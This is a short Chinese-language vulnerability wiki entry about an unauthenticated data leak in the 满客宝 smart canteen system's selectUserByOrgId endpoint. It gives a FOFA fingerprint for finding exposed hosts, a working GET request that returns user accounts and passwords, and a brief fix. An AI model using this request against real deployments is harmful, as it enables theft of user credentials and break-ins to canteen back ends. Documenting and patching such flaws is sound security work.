---
fofa: "icon_hash="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 满客宝智慧食堂系统 selectUserByOrgId 未授权访问漏洞

# 漏洞描述

由于满客宝智慧食堂系统 selectUserByOrgId 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄露系统用户账号密码等信息，进一步破解即可登录系统后台，导致系统处于极不安全的状态。

影响版本

满客宝智慧食堂系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 中 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="-409875651"

POC/EXP：

GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close

![image-20240801170752521](./.resource/满客宝智慧食堂系统selectUserByOrgId未授权访问漏洞/media/image-20240801170752521.png)


# 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
